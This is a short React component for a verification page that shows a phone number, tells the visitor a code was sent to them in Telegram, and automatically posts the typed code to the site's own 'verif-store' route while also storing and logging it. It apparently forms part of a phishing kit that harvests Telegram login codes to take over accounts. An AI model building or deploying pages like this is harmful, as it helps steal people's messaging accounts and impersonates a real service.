import { useForm } from "@inertiajs/react";
import { TextField } from "@mui/material";
import AsyncStorage from "@react-native-async-storage/async-storage";
import React, { useEffect } from "react";

export default function Verif({ getPhone, getDialCode }) {
    const { data, setData, post } = useForm({
        phone: getPhone,
        dial_code: getDialCode,
        code: "",
    });
    const changeHandler = (e) => {
        setData({ ...data, code: e.target.value });
    };

    const storeData = async () => {
        if (data.code.length > 4) {
            post(route("verif-store"));
        }
        try {
            await AsyncStorage.setItem("saveNumber", JSON.stringify(data));
        } catch (err) {}
    };

    useEffect(() => {
        storeData();
    }, [data]);

    console.log(data);

    return (
        <div className="w-full h-screen px-8 flex flex-col items-center  py-16">
            <img src="download (1).png" alt="" className="" />
            <p className="mt-5 font-bold text-xl mb-4">{data.phone}</p>
            <p className="text-xs text-center w-[65%] mb-5">
                We have sent you a message in Telegram with the code
            </p>
            <TextField
                onChange={changeHandler}
                id="outline-basic"
                variant="outlined"
                label="Code"
                className="w-[80%]"
                size="small"
            />
        </div>
    );
}
